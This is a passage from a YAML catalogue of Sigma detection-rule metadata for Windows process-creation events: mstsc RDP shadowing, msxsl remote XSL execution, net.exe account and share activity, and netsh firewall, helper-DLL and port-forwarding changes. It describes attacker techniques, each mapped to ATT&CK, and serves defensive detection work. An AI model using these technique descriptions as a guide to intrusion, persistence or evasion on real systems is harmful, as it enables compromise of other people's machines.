- detection_id: 6ba5a05f-b095-4f0a-8654-b825f4f16334
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mstsc_rdp_hijack_shadowing.yml
  name: Potential MSTSC Shadowing Activity
  description: Detects RDP session hijacking by using MSTSC shadowing
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1563.002
  tags:
  - attack.lateral-movement
  - attack.t1563.002
  time_window: ''
  references:
  - https://twitter.com/kmkz_security/status/1220694202301976576
  - https://github.com/kmkz/Pentesting/blob/47592e5e160d3b86c2024f09ef04ceb87d204995/Post-Exploitation-Cheat-Sheet
  false_positives:
  - Unknown
  notes: ''
- detection_id: 954f0af7-62dd-418f-b3df-a84bc2c7a774
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mstsc_remote_connection.yml
  name: New Remote Desktop Connection Initiated Via Mstsc.EXE
  description: 'Detects the usage of "mstsc.exe" with the "/v" flag to initiate a
    connection to a remote server.

    Adversaries may use valid accounts to log into a computer using the Remote Desktop
    Protocol (RDP). The adversary may then perform actions as the logged-on user.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  tags:
  - attack.lateral-movement
  - attack.t1021.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.001/T1021.001.md#t1021001---remote-desktop-protocol
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc
  false_positives:
  - WSL (Windows Sub System For Linux)
  notes: ''
- detection_id: 5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mstsc_run_local_rdp_file.yml
  name: Mstsc.EXE Execution With Local RDP File
  description: Detects potential RDP connection via Mstsc using a local ".rdp" file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/
  - https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/
  false_positives:
  - Likely with legitimate usage of ".rdp" files
  notes: ''
- detection_id: 6e22722b-dfb1-4508-a911-49ac840b40f8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mstsc_run_local_rdp_file_susp_location.yml
  name: Suspicious Mstsc.EXE Execution With Local RDP File
  description: Detects potential RDP connection via Mstsc using a local ".rdp" file
    located in suspicious locations.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/
  - https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/
  false_positives:
  - Likelihood is related to how often the paths are used in the environment
  notes: ''
- detection_id: ff3b6b39-e765-42f9-bb2c-ea6761e0e0f6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mstsc_run_local_rpd_file_susp_parent.yml
  name: Mstsc.EXE Execution From Uncommon Parent
  description: Detects potential RDP connection via Mstsc using a local ".rdp" file
    located in suspicious locations.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.lateral-movement
  time_window: ''
  references:
  - https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/
  - https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msxsl_execution.yml
  name: Msxsl.EXE Execution
  description: 'Detects the execution of the MSXSL utility. This can be used to execute
    Extensible Stylesheet Language (XSL) files. These files are commonly used to describe
    the processing and rendering of data within XML files.

    Adversaries can abuse this functionality to execute arbitrary files while potentially
    bypassing application whitelisting defenses.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1220
  tags:
  - attack.defense-evasion
  - attack.t1220
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/
  false_positives:
  - Msxsl is not installed by default and is deprecated, so unlikely on most systems.
  notes: ''
- detection_id: 75d0a94e-6252-448d-a7be-d953dff527bb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msxsl_remote_execution.yml
  name: Remote XSL Execution Via Msxsl.EXE
  description: Detects the execution of the "msxsl" binary with an "http" keyword
    in the command line. This might indicate a potential remote execution of XSL files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1220
  tags:
  - attack.defense-evasion
  - attack.t1220
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/
  false_positives:
  - Msxsl is not installed by default and is deprecated, so unlikely on most systems.
  notes: ''
- detection_id: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_groups_and_accounts_recon.yml
  name: Suspicious Group And Account Reconnaissance Activity Using Net.EXE
  description: 'Detects suspicious reconnaissance command line activity on Windows
    systems using Net.EXE

    Check if the user that executed the commands is suspicious (e.g. service accounts,
    LOCAL_SYSTEM)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087.001
  - T1087.002
  tags:
  - attack.discovery
  - attack.t1087.001
  - attack.t1087.002
  time_window: ''
  references:
  - https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/
  - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/
  - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/
  false_positives:
  - Inventory tool runs
  - Administrative activity
  notes: ''
- detection_id: cb7c4a03-2871-43c0-9bbb-18bbdb079896
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_share_unmount.yml
  name: Unmount Share Via Net.EXE
  description: Detects when when a mounted share is removed. Adversaries may remove
    share connections that are no longer useful in order to clean up traces of their
    operation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.005
  tags:
  - attack.defense-evasion
  - attack.t1070.005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.005/T1070.005.md
  false_positives:
  - Administrators or Power users may remove their shares via cmd line
  notes: ''
- detection_id: 2a072a96-a086-49fa-bcb5-15cc5a619093
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_start_service.yml
  name: Start Windows Service Via Net.EXE
  description: Detects the usage of the "net.exe" command to start a service using
    the "start" flag
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1569.002/T1569.002.md
  false_positives:
  - Legitimate administrator or user executes a service for legitimate reasons.
  notes: ''
- detection_id: 88872991-7445-4a22-90b2-a3adadb0e827
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_stop_service.yml
  name: Stop Windows Service Via Net.EXE
  description: Detects the stopping of a Windows service via the "net" utility.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  tags:
  - attack.impact
  - attack.t1489
  time_window: ''
  references:
  - https://ss64.com/nt/net-service.html
  false_positives:
  - There are many legitimate reasons to stop a service. This rule isn't looking for
    any suspicious behaviour in particular. Filter legitimate activity accordingly
  notes: ''
- detection_id: 3abd6094-7027-475f-9630-8ab9be7b9725
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_use_mount_admin_share.yml
  name: Windows Admin Share Mount Via Net.EXE
  description: Detects when an admin share is mounted using net.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view
  false_positives:
  - Administrators
  notes: ''
- detection_id: 7e6237fe-3ddb-438f-9381-9bf9de5af8d0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_use_mount_internet_share.yml
  name: Windows Internet Hosted WebDav Share Mount Via Net.EXE
  description: Detects when an internet hosted webdav share is mounted using the "net.exe"
    utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view
  false_positives:
  - Unknown
  notes: ''
- detection_id: f117933c-980c-4f78-b384-e3d838111165
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_use_mount_share.yml
  name: Windows Share Mount Via Net.EXE
  description: Detects when a share is mounted using the "net.exe" utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view
  false_positives:
  - Legitimate activity by administrators and scripts
  notes: ''
- detection_id: 1c67a717-32ba-409b-a45d-0fb704a73a81
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_use_network_connections_discovery.yml
  name: System Network Connections Discovery Via Net.EXE
  description: Adversaries may attempt to get a listing of network connections to
    or from the compromised system they are currently accessing or from remote systems
    by querying for information over the network.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1049
  tags:
  - attack.discovery
  - attack.t1049
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1049/T1049.md#atomic-test-1---system-network-connections-discovery
  false_positives:
  - Unknown
  notes: ''
- detection_id: d4498716-1d52-438f-8084-4a603157d131
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_use_password_plaintext.yml
  name: Password Provided In Command Line Of Net.EXE
  description: Detects a when net.exe is called with a password in the command line
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1021.002
  - T1078
  tags:
  - attack.defense-evasion
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.lateral-movement
  - attack.t1021.002
  - attack.t1078
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: cd219ff3-fa99-45d4-8380-a7d15116c6dc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_user_add.yml
  name: New User Created Via Net.EXE
  description: Identifies the creation of local users via the net.exe command.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.persistence
  - attack.t1136.001
  time_window: ''
  references:
  - https://eqllib.readthedocs.io/en/latest/analytics/014c3f51-89c6-40f1-ac9c-5688f26090ab.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1136.001/T1136.001.md
  false_positives:
  - Legitimate user creation.
  - Better use event IDs for user creation rather than command line rules.
  notes: ''
- detection_id: b9f0e6f5-09b4-4358-bae4-08408705bd5c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_user_add_never_expire.yml
  name: New User Created Via Net.EXE With Never Expire Option
  description: Detects creation of local users via the net.exe command with the option
    "never expire"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.persistence
  - attack.t1136.001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5b768e71-86f2-4879-b448-81061cbae951
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_user_default_accounts_manipulation.yml
  name: Suspicious Manipulation Of Default Accounts Via Net.EXE
  description: Detects suspicious manipulations of default accounts such as 'administrator'
    and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  tags:
  - attack.collection
  - attack.t1560.001
  time_window: ''
  references:
  - https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html
  - https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/
  - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/
  false_positives:
  - Some false positives could occur with the admin or guest account. It depends on
    the scripts being used by the admins in your env. If you experience a lot of FP
    you could reduce the level to medium
  notes: ''
- detection_id: 62510e69-616b-4078-b371-847da438cc03
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_net_view_share_and_sessions_enum.yml
  name: Share And Session Enumeration Using Net.EXE
  description: Detects attempts to enumerate file shares, printer shares and sessions
    using "net.exe" with the "view" flag.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1018
  tags:
  - attack.discovery
  - attack.t1018
  time_window: ''
  references:
  - https://eqllib.readthedocs.io/en/latest/analytics/b8a94d2f-dc75-4630-9d73-1edc6bd26fff.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md
  false_positives:
  - Legitimate use of net.exe utility by legitimate user
  notes: ''
- detection_id: cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_fw_add_rule.yml
  name: New Firewall Rule Added Via Netsh.EXE
  description: Detects the addition of a new rule to the Windows firewall via netsh
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  - attack.s0246
  time_window: ''
  references:
  - https://web.archive.org/web/20190508165435/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf
  false_positives:
  - Legitimate administration activity
  - Software installations
  notes: ''
- detection_id: a35f5a72-f347-4e36-8895-9869b0d5fc6d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_fw_allow_program_in_susp_location.yml
  name: Suspicious Program Location Whitelisted In Firewall Via Netsh.EXE
  description: Detects Netsh command execution that whitelists a program located in
    a suspicious location in the Windows Firewall
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://www.virusradar.com/en/Win32_Kasidet.AD/description
  - https://www.hybrid-analysis.com/sample/07e789f4f2f3259e7559fdccb36e96814c2dbff872a21e1fa03de9ee377d581f?environmentId=100
  false_positives:
  - Unknown
  notes: ''
- detection_id: 01aeb693-138d-49d2-9403-c4f52d7d3d62
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_fw_allow_rdp.yml
  name: RDP Connection Allowed Via Netsh.EXE
  description: Detects usage of the netsh command to open and allow connections to
    port 3389 (RDP). As seen used by Sarwent Malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://labs.sentinelone.com/sarwent-malware-updates-command-detonation/
  false_positives:
  - Legitimate administration activity
  notes: ''
- detection_id: 1a5fefe6-734f-452e-a07d-fc1c35bce4b2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_fw_delete_rule.yml
  name: Firewall Rule Deleted Via Netsh.EXE
  description: Detects the removal of a port or application rule in the Windows Firewall
    configuration using netsh
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://app.any.run/tasks/8bbd5b4c-b82d-4e6d-a3ea-d454594a37cc/
  false_positives:
  - Legitimate administration activity
  - Software installations and removal
  notes: ''
- detection_id: 57c4bf16-227f-4394-8ec7-1b745ee061c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_fw_disable.yml
  name: Firewall Disabled via Netsh.EXE
  description: Detects netsh commands that turns off the Windows firewall
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  - attack.s0108
  time_window: ''
  references:
  - https://www.winhelponline.com/blog/enable-and-disable-windows-firewall-quickly-using-command-line/
  - https://app.any.run/tasks/210244b9-0b6b-4a2c-83a3-04bd3175d017/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md#atomic-test-1---disable-microsoft-defender-firewall
  false_positives:
  - Legitimate administration activity
  notes: ''
- detection_id: 347906f3-e207-4d18-ae5b-a9403d6bcdef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_fw_enable_group_rule.yml
  name: Netsh Allow Group Policy on Microsoft Defender Firewall
  description: Adversaries may modify system firewalls in order to bypass controls
    limiting network usage
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md#atomic-test-3---allow-smb-and-rdp-on-microsoft-defender-firewall
  - https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior
  false_positives:
  - Legitimate administration activity
  notes: ''
- detection_id: 0e4164da-94bc-450d-a7be-a4b176179f1f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_fw_rules_discovery.yml
  name: Firewall Configuration Discovery Via Netsh.EXE
  description: Adversaries may look for details about the network configuration and
    settings of systems they access or through information discovery of remote systems
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  tags:
  - attack.discovery
  - attack.t1016
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1016/T1016.md#atomic-test-2---list-windows-firewall-rules
  - https://ss64.com/nt/netsh.html
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: a70dcb37-3bee-453a-99df-d0c683151be6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_fw_set_rule.yml
  name: Firewall Rule Update Via Netsh.EXE
  description: Detects execution of netsh with the "advfirewall" and the "set" option
    in order to set new values for properties of a existing rule
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://ss64.com/nt/netsh.html
  false_positives:
  - Legitimate administration activity
  - Software installations and removal
  notes: ''
- detection_id: 56321594-9087-49d9-bf10-524fe8479452
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_helper_dll_persistence.yml
  name: Potential Persistence Via Netsh Helper DLL
  description: 'Detects the execution of netsh with "add helper" flag in order to
    add a custom helper DLL. This technique can be abused to add a malicious helper
    DLL that can be used as a persistence proxy that gets called when netsh.exe is
    executed.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.007
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.007
  - attack.s0108
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.007/T1546.007.md
  - https://github.com/outflanknl/NetshHelperBeacon
  - https://web.archive.org/web/20160928212230/https://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d3c3861d-c504-4c77-ba55-224ba82d0118
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_packet_capture.yml
  name: New Network Trace Capture Started Via Netsh.EXE
  description: Detects the execution of netsh with the "trace" flag in order to start
    a network capture
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1040
  tags:
  - attack.discovery
  - attack.credential-access
  - attack.t1040
  time_window: ''
  references:
  - https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/
  - https://klausjochem.me/2016/02/03/netsh-the-cyber-attackers-tool-of-choice/
  false_positives:
  - Legitimate administration activity
  notes: ''
- detection_id: 322ed9ec-fcab-4f67-9a34-e7c6aef43614
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_port_forwarding.yml
  name: New Port Forwarding Rule Added Via Netsh.EXE
  description: Detects the execution of netsh commands that configure a new port forwarding
    (PortProxy) rule
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.lateral-movement
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1090
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html
  - https://adepts.of0x.cc/netsh-portproxy-code/
  - https://www.dfirnotes.net/portproxy_detection/
  false_positives:
  - Legitimate administration activity
  - WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)
  notes: ''
- detection_id: 782d6f3e-4c5d-4b8c-92a3-1d05fed72e63
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_port_forwarding_3389.yml
  name: RDP Port Forwarding Rule Added Via Netsh.EXE
  description: Detects the execution of netsh to configure a port forwarding of port
    3389 (RDP) rule
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
